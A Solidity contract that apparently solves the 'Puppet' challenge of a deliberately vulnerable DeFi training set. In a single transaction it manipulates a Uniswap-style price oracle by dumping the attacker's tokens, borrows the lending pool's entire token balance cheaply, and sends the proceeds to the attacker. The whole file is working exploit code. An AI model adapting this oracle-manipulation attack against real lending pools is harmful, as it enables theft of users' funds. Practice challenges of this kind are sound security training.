// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswap {
    function tokenToEthSwapInput(
        uint256 tokensSold,
        uint256 minEth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapInput(
        uint256 minTokens,
        uint256 deadline
    ) external payable returns (uint256);
}

interface Itoken {
    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool success);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}

contract PuppetHack {
    IUniswap public uniswap;
    Itoken public token;
    IPool public pool;

    constructor(
        address _uinswap,
        address _token,
        address _pool,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        uniswap = IUniswap(_uinswap);
        token = Itoken(_token);
        pool = IPool(_pool);

        // initial balance of Attacker
        uint256 initialAttackerBalance = token.balanceOf(msg.sender);

        // We use ERC-2612 signature to call token.approve on behalf of player, then transfer DVT to this contract
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,
            r,
            s
        );

        token.transferFrom(msg.sender, address(this), initialAttackerBalance);
        // Swap the attaker's entire 1000DVT balance for any amount of ETH creating a very imbalanced ration in the exchange
        token.approve(address(uniswap), initialAttackerBalance);
        uniswap.tokenToEthSwapInput(
            initialAttackerBalance,
            1,
            block.timestamp + 300
        );

        // execute borrow on Pool
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: 20 ether}(poolBalance, address(this));

        // Reser the initial Price manipulation swap to close any arbitrage opportunity
        uniswap.ethToTokenSwapInput{value: 1 ether}(1, block.timestamp + 300);

        // send all DVT and remaining ETH back to the attacker
        token.transfer(msg.sender, token.balanceOf(address(this)));
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "hack faild");
    }
}
